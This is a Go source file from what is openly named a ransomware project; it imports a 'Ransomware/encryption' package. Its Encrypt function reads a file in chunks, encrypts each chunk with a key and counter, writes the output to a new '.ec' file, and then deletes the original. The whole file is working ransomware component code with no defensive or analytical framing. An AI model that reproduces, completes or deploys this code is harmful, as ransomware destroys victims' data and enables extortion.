package file

import (
	"Ransomware/encryption"
	"os"
)

// Encrypt : encrypts file with key
func Encrypt(fileSrc string, key []byte) (string, error) {

	encryptedFileName := fileSrc + ".ec"
	decryptedFile, err := os.Open(fileSrc)

	counter := []byte{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}

	if err != nil {
		return "", err
	}

	fi, err := decryptedFile.Stat()

	if err != nil {
		return "", err
	}

	//Reads Data from file
	var i int64
	data := make([]byte, MaxSize)
	iterations := fi.Size() / int64(MaxSize)

	//Creates encrypted File
	encryptedFile, err := os.Create(encryptedFileName)

	if err != nil {
		return "", err
	}

	defer encryptedFile.Close()

	//Encrypts chunks of MaxSize data to encrypted file
	for i = 0; i < iterations; i++ {
		decryptedFile.Read(data)
		encryption.Encrypt(&data, &key, &counter)
		_, err = encryptedFile.Write(data)
		if err != nil {
			return "", err
		}

		encryptedFile.Sync()
	}

	//Encrypts remaining of file (less then MaxSize)
	if fi.Size()%int64(MaxSize) != 0 {
		data = make([]byte, fi.Size()-iterations*int64(MaxSize))
		decryptedFile.Read(data)
		encryption.Encrypt(&data, &key, &counter)
		_, err = encryptedFile.Write(data)
		if err != nil {
			return "", err
		}

		encryptedFile.Sync()
	}

	decryptedFile.Close()

	os.Remove(fileSrc)

	return encryptedFileName, nil
}
